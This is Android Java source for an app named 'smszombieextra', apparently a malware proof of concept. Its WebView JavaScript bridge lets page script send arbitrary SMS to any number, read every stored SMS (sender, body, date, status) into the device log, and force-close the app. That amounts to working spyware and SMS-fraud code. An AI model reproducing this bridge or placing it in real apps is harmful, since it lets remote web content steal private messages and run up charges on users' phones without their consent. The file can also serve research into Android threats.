package com.example.smszombieextra;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.widget.Toast;

public class JavaScriptInterface {
    public static String TAG = "SMS_ZOMBIE";
    private final Activity activity;

    public JavaScriptInterface(Activity activity) {
        this.activity = activity;
    }

    // needs SMS permission to be enabled (does not prompt for it)
    @JavascriptInterface
    public void JsSendSMS(String phoneNo, String msg){
        Log.i(TAG, "Received: " + phoneNo + " " + msg)                                                                                                                                                                                                              ;
        if (!(phoneNo.isEmpty()  || msg.isEmpty())) {
            try {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    @SuppressLint("Range")
    @JavascriptInterface
    public void JsDumpSMS() {
        final String address = "address";
        final String body = "body";
        final String type = "type";
        final String status = "status";
        final String date = "date";
        final String sms = "content://sms/";

        Uri uriSMSURI = Uri.parse(sms);
        Cursor cur = activity.getContentResolver()
                .query(uriSMSURI, null, null, null, null);

        Log.i(TAG, "Dumping SMS: " + cur.getCount());
        while (cur.moveToNext()) {
            Log.i(TAG, cur.getString(cur.getColumnIndex(address)));
            Log.i(TAG, cur.getString(cur.getColumnIndex(body)));
            Log.i(TAG, cur.getString(cur.getColumnIndex(type)));
            Log.i(TAG, cur.getString(cur.getColumnIndex(status)));
            Log.i(TAG, cur.getString(cur.getColumnIndex(date)));
        }

        cur.close();
    }

    @JavascriptInterface
    public void JsCloseApp() {
        activity.finishAndRemoveTask();
        int pid = android.os.Process.myPid();
        android.os.Process.killProcess(pid);
    }
}